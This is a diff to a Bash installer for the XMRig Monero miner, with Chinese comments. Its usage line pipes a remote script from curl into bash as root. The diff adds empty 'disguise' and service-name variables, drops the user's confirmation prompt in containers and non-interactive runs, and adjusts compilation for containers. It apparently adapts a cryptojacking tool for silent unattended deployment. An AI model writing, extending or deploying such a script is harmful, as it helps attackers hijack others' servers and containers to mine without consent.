@@ -1,13 +1,33 @@
 #!/bin/bash
 
 # XMR Mining Script
-# Usage: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口
+# Usage: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [--auto-compile]
 
 set -e
 
 # 设置环境变量
 export HOME=/root
 export LC_ALL=en_US.UTF-8
+
+# 初始化全局变量
+AUTO_COMPILE=false
+IS_CONTAINER=false
+DISGUISE_NAME=""
+SERVICE_NAME=""
+COMPILE_FROM_SOURCE=false
+
+# 解析命令行参数
+for arg in "$@"; do
+    case $arg in
+        --auto-compile)
+            AUTO_COMPILE=true
+            shift
+            ;;
+        *)
+            # 其他参数保持原样
+            ;;
+    esac
+done
 
 # 颜色定义
 RED='\033[0;31m'
@@ -189,14 +209,21 @@ detect_system() {
             ARCH="arm64"
             log_warn "检测到ARM64架构，XMRig官方不提供预编译版本"
             log_warn "需要从源码编译安装"
-            echo
-            read -p "是否继续编译安装？(y/n): " -n 1 -r
-            echo
-            if [[ ! $REPLY =~ ^[Yy]$ ]]; then
-                log_info "用户取消安装"
-                exit 0
+            
+            # 在容器环境或非交互式环境中自动继续
+            if [[ "$IS_CONTAINER" == "true" ]] || [[ ! -t 0 ]] || [[ "$AUTO_COMPILE" == "true" ]]; then
+                log_info "检测到容器/非交互式环境，自动启用源码编译"
+                COMPILE_FROM_SOURCE=true
+            else
+                echo
+                read -p "是否继续编译安装？(y/n): " -n 1 -r
+                echo
+                if [[ ! $REPLY =~ ^[Yy]$ ]]; then
+                    log_info "用户取消安装"
+                    exit 0
+                fi
+                COMPILE_FROM_SOURCE=true
             fi
-            COMPILE_FROM_SOURCE=true
             ;;
         *)
             log_error "不支持的CPU架构: $ARCH"
@@ -747,7 +774,17 @@ compile_from_source() {
     
     # 运行cmake配置
     log_info "运行cmake配置..."
-    if ! cmake .. -DCMAKE_BUILD_TYPE=Release; then
+    local cmake_flags="-DCMAKE_BUILD_TYPE=Release"
+    
+    # 在容器环境中添加额外的编译优化
+    if [[ "$IS_CONTAINER" == "true" ]]; then
+        log_info "检测到容器环境，应用容器优化编译选项"
+        cmake_flags="$cmake_flags -DWITH_HWLOC=OFF -DWITH_TLS=OFF"
+        # 在资源受限的容器中禁用一些可选功能
+        cmake_flags="$cmake_flags -DWITH_OPENCL=OFF -DWITH_CUDA=OFF"
+    fi
+    
+    if ! cmake .. $cmake_flags; then
         log_error "cmake配置失败"
         exit 1
     fi
@@ -755,9 +792,25 @@ compile_from_source() {
     # 编译
     log_info "开始编译（这可能需要几分钟）..."
     local cpu_cores=$(nproc 2>/dev/null || echo "1")
+    
+    # 在容器环境中限制并行编译数量以避免内存不足
+    if [[ "$IS_CONTAINER" == "true" ]] && [[ $cpu_cores -gt 2 ]]; then
+        cpu_cores=2
+        log_info "容器环境限制编译并行数为: $cpu_cores"
+    fi
+    
     if ! make -j"$cpu_cores"; then
         log_error "编译失败"
-        exit 1
+        # 在容器环境中尝试单线程编译
+        if [[ "$IS_CONTAINER" == "true" ]] && [[ $cpu_cores -gt 1 ]]; then
+            log_warn "多线程编译失败，尝试单线程编译..."
+            if ! make -j1; then
+                log_error "单线程编译也失败"
+                exit 1
+            fi
+        else
+            exit 1
+        fi
     fi
     
     # 检查编译结果
